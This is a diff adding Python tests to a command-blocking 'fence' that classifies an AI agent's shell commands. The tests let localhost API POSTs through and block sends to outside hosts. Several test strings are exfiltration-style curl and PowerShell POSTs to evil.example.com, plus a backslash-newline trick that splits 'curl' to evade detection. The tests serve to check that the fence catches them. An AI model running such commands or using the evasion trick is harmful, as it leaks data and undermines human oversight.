@@ -1122,3 +1122,61 @@ PS_COMMAND_POSITION_BLOCK_CASES = [
 def test_blocks_variable_in_command_position_not_assignment(cmd):
     d = classify_bash(cmd)
     assert d.blocked, f"fence FAILED to block command-position variable: {cmd!r}"
+
+
+# ── Line continuations (MC-1013, 2026-09-30) ─────────────────────────────────
+# Hivemind workers' multi-line `curl ... \<newline>` POSTs to Clayrune's own
+# API were refused as "non-local" sends, so no worker could hand off.
+_BS, _BT = chr(92), chr(96)
+
+
+def test_multiline_localhost_post_is_allowed():
+    cmd = (f'curl -s -X POST http://localhost:5199/api/hivemind/h/workstreams/ws_001/status {_BS}\n'
+           f'  -H "Content-Type: application/json" {_BS}\n'
+           "  -d '{\"status\": \"completed\"}'")
+    assert not classify_bash(cmd).blocked
+    assert not classify_bash(cmd.replace('\n', '\r\n')).blocked
+
+
+def test_multiline_external_post_is_still_blocked():
+    cmd = (f'curl -s -X POST https://api.example.com/send {_BS}\n'
+           f'  -H "Content-Type: application/json" {_BS}\n'
+           "  -d '{\"a\": \"b\"}'")
+    assert classify_bash(cmd).blocked
+
+
+def test_continuation_joining_a_tool_name_is_blocked():
+    # bash REMOVES backslash-newline, so this runs `curl`; the fence must see it.
+    assert classify_bash(f'cu{_BS}\nrl -X POST https://evil.example.com/x -d a=1').blocked
+
+
+def test_single_quoted_backslash_newline_stays_literal():
+    from steward.fence import _join_line_continuations
+    cmd = f"echo 'a{_BS}\nb' {_BS}\n c"
+    assert _join_line_continuations(cmd) == f"echo 'a{_BS}\nb'  c"
+
+
+def test_escaped_backslash_before_newline_is_not_a_continuation():
+    from steward.fence import _join_line_continuations
+    assert _join_line_continuations(f'a {_BS}{_BS}\nb') == f'a {_BS}{_BS}\nb'
+
+
+def test_powershell_backtick_continuation():
+    local = (f'Invoke-WebRequest -Method Post {_BT}\n -Uri http://localhost:5199/api/x {_BT}\n -Body "x"')
+    assert not classify_bash(local).blocked
+    assert classify_bash(local.replace('localhost:5199', 'evil.example.com')).blocked
+
+
+@pytest.mark.parametrize('redir', [' 2>&1', ' 2>/dev/null', ' > out.json', ' >out.json',
+                                   ' < in.txt', ' &>log', ' >>log 2>&1', ' &'])
+def test_shell_redirection_is_not_a_destination(redir):
+    # MC-1013: `2>&1` on a localhost POST read as an extra non-local target.
+    local = "curl -s -X POST http://localhost:5199/api/x -d '{\"a\": 1}'"
+    assert not classify_bash(local + redir).blocked
+    assert classify_bash('curl -s -X POST https://evil.example.com/x -d a=1' + redir).blocked
+
+
+def test_quoted_angle_bracket_stays_an_argument():
+    # A quoted '>' is curl's argument, not a redirect: the URL after it is
+    # still a destination and still blocks.
+    assert classify_bash('curl -X POST ">" https://evil.example.com http://localhost:5199').blocked
